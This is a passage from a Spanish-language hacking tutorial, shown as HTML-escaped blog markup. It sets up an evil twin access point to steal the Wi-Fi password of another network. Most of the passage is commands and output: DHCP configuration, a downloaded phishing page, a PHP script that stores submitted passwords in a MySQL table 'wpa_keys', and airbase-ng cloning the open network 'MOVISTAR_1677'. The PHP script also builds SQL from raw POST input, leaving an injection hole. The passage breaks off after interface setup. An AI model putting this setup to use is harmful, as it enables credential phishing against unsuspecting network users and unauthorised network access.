nosotros, pudiendo visualizarlas para posteriormente llevar a cabo la autenticación contra la red inalámbrica
ajena.&lt;/p&gt;

&lt;p&gt;Cabe decir que el paso de solicitar la contraseña de la red inalámbrica es opcional, de la misma manera
podríamos solicitar algún otro tipo de dato.&lt;/p&gt;

&lt;h4 id=&quot;creación-de-fichero-dhcp&quot;&gt;Creación de fichero DHCP&lt;/h4&gt;

&lt;p&gt;Comenzaremos creando un simple fichero DHCP con nombre &lt;strong&gt;dhcpd.conf&lt;/strong&gt; bajo la ruta &lt;strong&gt;/etc/&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/etc]
└──╼ &lt;span class=&quot;c&quot;&gt;#pwd&lt;/span&gt;
/etc
┌─[root@parrot]─[/etc]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat dhcpd.conf &lt;/span&gt;
authoritative&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
default-lease-time 600&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
max-lease-time 7200&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
subnet 192.168.1.128 netmask 255.255.255.128 &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
option subnet-mask 255.255.255.128&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
option broadcast-address 192.168.1.255&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
option routers 192.168.1.129&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
option domain-name-servers 8.8.8.8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
range 192.168.1.130 192.168.1.140&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En este fichero, indicamos que el promedio de vida mínimo será de 600 segundos y el máximos de 7200. Entre
este rango, una vez pasado el tiempo estimado se asignará una nueva IP al cliente asociado a nuestro
AP (simplemente por hacerla dinámica).&lt;/p&gt;

&lt;p&gt;Para evitar entrar en conflicto con la topología de mi red real, como la pasarela es la 192.168.1.1 y algunos de los equipos están configurados en el rango del 192.168.1.2 al 192.168.1.100, lo que he hecho ha sido asignar un nuevo segmento, comprendido entre el rango 192.168.1.130 hasta el 192.168.1.140. Asignaremos como máscara de red la 255.255.255.128 y como nueva pasarela la 192.168.1.129. Todo esta configuración será gestionada por una nueva interfaz que crearemos en breve.&lt;/p&gt;

&lt;h4 id=&quot;configuración-de-página-web&quot;&gt;Configuración de página web&lt;/h4&gt;

&lt;p&gt;Nos descargaremos la siguiente plantilla para hacer nuestro ataque:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;http://ge.tt/9EyXb5w2&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;inicialización-de-servicios&quot;&gt;Inicialización de servicios&lt;/h4&gt;

&lt;p&gt;Iniciamos los servicios &lt;strong&gt;mysql&lt;/strong&gt; y &lt;strong&gt;apache2&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/etc]
└──╼ &lt;span class=&quot;c&quot;&gt;#service apache2 start &amp;amp;&amp;amp; service mysql start&lt;/span&gt;
┌─[root@parrot]─[/etc]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo $?&lt;/span&gt;
0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Posteriormente comprobamos que nuestro servidor web funciona correctamente:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2WbYt.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Todo este diseño es personalizable y se puede retocar sin ningún tipo de problema desde el HTML. En mi caso,
lo voy a dejar así.&lt;/p&gt;

&lt;h4 id=&quot;creación-de-base-de-datos-via-mysql&quot;&gt;Creación de base de datos via MYSQL&lt;/h4&gt;

&lt;p&gt;Ahora bien, si nos fijamos en el &lt;strong&gt;ACTION&lt;/strong&gt; del HTML principal, nos encontramos con esto:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/var/www/html]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat index.html | grep action&lt;/span&gt;
            &amp;lt;&lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;td&amp;gt;&amp;lt;form &lt;span class=&quot;nv&quot;&gt;action&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;dbconnect.php&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;method&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
┌─[root@parrot]─[/var/www/html]
└──╼ &lt;span class=&quot;c&quot;&gt;#cat dbconnect.php &lt;/span&gt;
&amp;lt;?php
session_start&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
ob_start&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fakeap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fakeap&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;rogue_AP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$tbl_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;wpa_keys&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

// Create connection
&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; mysqli_connect&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$host&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$username&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$pass&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$dbname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
// Check connection
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    die&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connection failed: &quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; mysqli_connect_error&lt;span class=&quot;o&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$password1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password1'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$password2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'password2'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;INSERT INTO wpa_keys (password1, password2) VALUES ('&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password1&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;', '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$password2&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mysqli_query&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;New record created successfully&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Error: &quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$sql&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; mysqli_error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

mysqli_close&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$conn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
header&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;location:upgrading.html&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
ob_end_flush&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;El &lt;strong&gt;action&lt;/strong&gt; viene definido por el fichero &lt;strong&gt;dbconnect.php&lt;/strong&gt;, el cual si nos fijamos, lleva a cabo una
autenticación a través del servicio &lt;strong&gt;MYSQL&lt;/strong&gt; a una tabla y base de datos que no existen. Por tanto, hay que
crearla.&lt;/p&gt;

&lt;p&gt;Crear la base de datos en este caso es bastante sencillo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/var/www/html]
└──╼ &lt;span class=&quot;c&quot;&gt;#mysql -uroot&lt;/span&gt;
Welcome to the MariaDB monitor.  Commands end with &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; or &lt;span class=&quot;se&quot;&gt;\g&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Your MariaDB connection &lt;span class=&quot;nb&quot;&gt;id &lt;/span&gt;is 32
Server version: 10.1.37-MariaDB-3 Debian buildd-unstable

Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type &lt;span class=&quot;s1&quot;&gt;'help;'&lt;/span&gt; or &lt;span class=&quot;s1&quot;&gt;'\h'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;help. Type &lt;span class=&quot;s1&quot;&gt;'\c'&lt;/span&gt; to clear the current input statement.

MariaDB &lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;none&lt;span class=&quot;o&quot;&gt;)]&amp;gt;&lt;/span&gt; create database rogue_AP&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 1 row affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[(&lt;/span&gt;none&lt;span class=&quot;o&quot;&gt;)]&amp;gt;&lt;/span&gt; use rogue_AP&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Database changed
MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; create table wpa_keys&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password1 varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, password2 varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 0 rows affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.40 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; show tables
    -&amp;gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+--------------------+
| Tables_in_rogue_AP |
+--------------------+
| wpa_keys           |
+--------------------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; describe wpa_keys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-----------+-------------+------+-----+---------+-------+
| Field     | Type        | Null | Key | Default | Extra |
+-----------+-------------+------+-----+---------+-------+
| password1 | varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | YES  |     | NULL    |       |
| password2 | varchar&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;32&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | YES  |     | NULL    |       |
+-----------+-------------+------+-----+---------+-------+
2 rows &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez creada, ya podemos insertar valores en ella:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; insert into wpa_keys&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;password1, password2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; values &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 1 row affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.12 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;from wpa_keys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-----------+-----------+
| password1 | password2 |
+-----------+-----------+
| &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;      | &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;      |
+-----------+-----------+
1 row &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Si probamos a introducir las credenciales desde la página web, vemos que nos encontramos con el siguiente error:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Connection failed: Access denied for user 'fakeap'@'localhost'&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Lo cual es normal, pues está intentando autenticar contra la base de datos haciendo uso del usuario
&lt;strong&gt;fakeap&lt;/strong&gt;, el cual no está creado. Por tanto, lo creamos y asignamos máximos privilegios sobre la base de datos creada:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; create user fakeap@localhost identified by &lt;span class=&quot;s1&quot;&gt;'fakeap'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 0 rows affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; grant all privileges on rogue_AP.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; to &lt;span class=&quot;s1&quot;&gt;'fakeap'&lt;/span&gt;@&lt;span class=&quot;s1&quot;&gt;'localhost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
Query OK, 0 rows affected &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y ahora ya tras introducir las credenciales desde la web, veremos que estas son añadidasq a nuestra base de
datos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; &lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;from wpa_keys&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+------------------+------------------+
| password1        | password2        |
+------------------+------------------+
| &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;             | &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;             |
| pruebadesdelaweb | pruebadesdelaweb |
+------------------+------------------+
2 rows &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00 sec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

MariaDB &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;rogue_AP]&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;creación-de-falso-punto-de-acceso-via-airbase&quot;&gt;Creación de falso punto de acceso via Airbase&lt;/h4&gt;

&lt;p&gt;Comenzamos a montar nuestro Fake AP. Para ello, a través de la utilidad &lt;strong&gt;airbase&lt;/strong&gt;, generaremos un falso
punto de acceso en el canal especificado.&lt;/p&gt;

&lt;p&gt;La idea en este punto, es analizar el entorno y listar los puntos de acceso disponibles. Aquel cuya contraseña
queramos averiguar, será el que clonaremos, generando un nuevo punto de acceso &lt;strong&gt;OPN&lt;/strong&gt; con el mismo ESSID.&lt;/p&gt;

&lt;p&gt;Supongamos que la red cuya contraseña quiero averiguar es &lt;strong&gt;MOVISTAR_1677&lt;/strong&gt;, perfecto pues entonces hacemos lo
siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/var/www/html]
└──╼ &lt;span class=&quot;c&quot;&gt;#airbase-ng -e MOVISTAR_1677 -c 7 -P wlan0mon&lt;/span&gt;
22:13:39  Created tap interface at0
22:13:39  Trying to &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;MTU on at0 to 1500
22:13:39  Access Point with BSSID E4:70:B8:D3:93:5C started.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Con esto, hemos conseguido crear un punto de acceso con nombre &lt;strong&gt;MOVISTAR_1677&lt;/strong&gt; en el canal 7, sin
autenticación.&lt;/p&gt;

&lt;h4 id=&quot;creación-de-interfaz-y-asignación-de-segmentos&quot;&gt;Creación de interfaz y asignación de segmentos&lt;/h4&gt;

&lt;p&gt;Ya con el punto de acceso creado, comenzamos creando una nueva interfaz &lt;strong&gt;at0&lt;/strong&gt;, la cual en cuanto a
propiedades debe ser equivalente al fichero &lt;strong&gt;dhcpd.conf&lt;/strong&gt; previamente creado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig at0 192.168.1.129 netmask 255.255.255.128&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig&lt;/span&gt;
at0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        ether e4:70:b8:d3:93:5c  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 57  bytes 8828 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;8.6 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        inet 192.168.1.43  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::c114:795c:5d1f:78a7  prefixlen 64  scopeid 0x20&amp;lt;&lt;span class=&quot;nb&quot;&gt;link&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
        ether 80:ce:62:3c:eb:a1  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ethernet&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 6777682  bytes 8286953540 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;7.7 GiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3292154  bytes 880484597 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;839.6 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;73&amp;lt;UP,LOOPBACK,RUNNING&amp;gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10&amp;lt;host&amp;gt;
        loop  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Local Loopback&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 772442  bytes 1353509541 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2 GiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 772442  bytes 1353509541 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1.2 GiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;867&amp;lt;UP,BROADCAST,NOTRAILERS,RUNNING,PROMISC,ALLMULTI&amp;gt;  mtu 1800
        unspec E4-70-B8-D3-93-5C-00-00-00-00-00-00-00-00-00-00  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNSPEC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 1179679  bytes 610643779 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;582.3 MiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 1078475  overruns 0  frame 0
        TX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

┌─[root@parrot]─[/home/s4vitar]
└──╼ &lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
